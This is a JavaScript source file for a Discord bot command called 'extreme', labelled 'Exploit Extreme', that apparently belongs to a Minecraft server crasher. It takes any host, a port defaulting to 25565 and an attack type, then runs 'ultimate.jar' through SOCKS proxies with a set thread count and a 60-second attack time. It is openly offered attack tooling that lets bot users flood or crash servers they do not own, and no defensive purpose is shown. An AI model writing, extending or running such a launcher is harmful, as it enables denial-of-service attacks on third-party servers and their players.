/** format */

const Command = require('../structure/command.js');
const threads = require('../jsons/threads.json');
const hostValidattor = require('is-valid-hostname');

module.exports = new Command({
    name: "extreme",
    description: "Exploit Extreme",
    permissions: "SEND_MESSAGES",
    slashCommandOptions: [{
        name: "host",
        type: "STRING",
        description: "Enter host or ip server",
        required: true
    }, {
        name: "type",
        description: "Type attack",
        type: 'STRING',
        choices: [{
            name: 'byte1',
            value: 'byte1'
        }, {
            name: 'byte2',
            value: 'byte2'
        }], 
        required: true
    }, {
        name: "port",
        description: "Enter port server",
        type: "NUMBER",
        required: false
    }],
    async execute(client, args, interaction, crashers){
        const host = args.getString("host");
        const port = args.getNumber("port") || 25565;
        const type = args.getString("type");


        if (hostValidattor(host) == false) return crashers.errorembed(client, interaction, interaction.commandName, "Не валидный IP"); 

        crashers.runcrasher(client, interaction, {
            jarname: "ultimate.jar",
            jarargs: `host=${host} port=${port} proxiesFile=proxies/socks_proxies.txt threads=${threads.extreme} attackTime=60 exploit=${type}`
        }, {
            method: "Extreme 💥",
            host: host,
            port: `${port}`
        });
    }
});